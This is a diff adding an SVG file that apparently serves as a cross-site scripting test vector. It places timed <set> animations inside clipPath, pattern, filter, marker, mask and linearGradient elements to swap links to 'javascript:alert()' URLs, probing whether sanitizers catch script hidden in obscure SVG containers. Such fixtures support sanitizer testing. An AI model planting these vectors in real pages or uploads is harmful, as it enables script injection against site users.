@@ -1,0 +1,27 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> 
+
+<clipPath id="a" > 
+<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" /> 
+</clipPath> 
+
+<pattern id="b"> 
+<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" /> 
+</pattern> 
+
+<filter id="c"> 
+<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" /> 
+</filter> 
+
+<marker id="d"> 
+<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" /> 
+</marker> 
+
+<mask id="e"> 
+<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" /> 
+</mask> 
+
+<linearGradient id="f"> 
+<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" /> 
+</linearGradient> 
+
+</svg>
